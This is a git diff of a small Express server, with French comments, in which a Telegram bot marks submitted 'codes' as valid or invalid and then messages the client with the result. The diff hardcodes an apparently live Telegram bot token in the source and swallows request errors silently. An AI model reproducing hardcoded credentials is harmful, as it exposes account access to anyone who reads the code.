@@ -13,17 +13,34 @@ const codes = {};
 
 // Endpoint pour enregistrer la demande de validation (depuis le site)
 app.post('/api/request', (req, res) => {
-  const { code, type, requestId } = req.body;
+  const { code, type, requestId, chat_id } = req.body;
   if (!code || !type || !requestId) return res.status(400).json({ ok: false });
-  codes[requestId] = { code, type, status: 'pending' };
+  codes[requestId] = { code, type, status: 'pending', chat_id };
   res.json({ ok: true });
 });
 
 // Endpoint pour le bot Telegram : valider/refuser un code
-app.post('/api/validate', (req, res) => {
+const axios = require('axios');
+const TELEGRAM_BOT_TOKEN = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
+app.post('/api/validate', async (req, res) => {
   const { requestId, result } = req.body;
   if (!codes[requestId]) return res.status(404).json({ ok: false });
   codes[requestId].status = result === 'OUI' ? 'valid' : 'invalid';
+  // Envoyer un message au client si chat_id est connu
+  const chat_id = codes[requestId].chat_id;
+  if (chat_id) {
+    let text = '';
+    if (result === 'OUI') text = '✅ VOTRE CODE EST BON';
+    else if (result === 'NON') text = '❌ VOTRE CODE N\'EST PAS BON';
+    if (text) {
+      try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          chat_id,
+          text
+        });
+      } catch {}
+    }
+  }
   res.json({ ok: true });
 });
 
